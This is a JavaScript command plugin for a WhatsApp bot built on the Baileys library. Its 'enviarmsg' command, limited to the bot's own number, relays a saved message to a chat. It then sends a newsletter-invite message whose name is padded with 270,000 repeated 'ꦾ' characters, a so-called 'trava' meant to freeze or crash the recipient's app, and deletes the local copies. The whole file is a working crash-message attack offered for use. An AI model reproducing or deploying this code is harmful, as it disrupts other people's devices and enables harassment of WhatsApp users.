import fs from 'fs';
import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

const FILE_PATH = './mensajes_guardados.json';

let handler = async (m, { conn }) => {
  try {
    if (m.isGroup) return m.reply('❌ No usar en grupos.');

    const botNumber = conn.user?.jid || '';
    if (m.sender !== botNumber) return m.reply('❌ Solo número del bot.');

    if (!fs.existsSync(FILE_PATH)) return m.reply('❌ No hay mensaje guardado.');
    const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
    if (!mensaje?.message) return m.reply('❌ Archivo dañado.');

    // 1. Generar mensaje desde archivo
    const msgGenerado = await generateWAMessageFromContent(m.chat, mensaje.message, { userJid: conn.user.id });

    // 2. Enviar a destino (m.chat)
    await conn.relayMessage(m.chat, msgGenerado.message, { messageId: msgGenerado.key.id });

    // 3. Enviar la misma copia al chat interno del bot
    await conn.relayMessage(conn.user.id, msgGenerado.message, { messageId: msgGenerado.key.id });

    // 4. Eliminar en chat interno
    await conn.sendMessage(conn.user.id, { delete: msgGenerado.key });

    // --- Repetir para el mensaje canal ---

    const travas = 'ꦾ'.repeat(90000);
    const canal = {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363282786345717@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas + travas + travas,
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    };

    const msgCanal = await generateWAMessageFromContent(m.chat, canal, { userJid: conn.user.id });

    await conn.relayMessage(m.chat, msgCanal.message, { messageId: msgCanal.key.id });
    await conn.relayMessage(conn.user.id, msgCanal.message, { messageId: msgCanal.key.id });
    await conn.sendMessage(conn.user.id, { delete: msgCanal.key });

    // Confirmación visible
    await conn.sendMessage(m.chat, { text: '✅ Mensajes enviados y eliminados localmente.' }, { quoted: m });

  } catch (e) {
    console.error('[ERROR enviarmsg]:', e);
    return m.reply('❌ Error:\n' + (e.message || e));
  }
};

handler.command = ['enviarmsg'];
export default handler;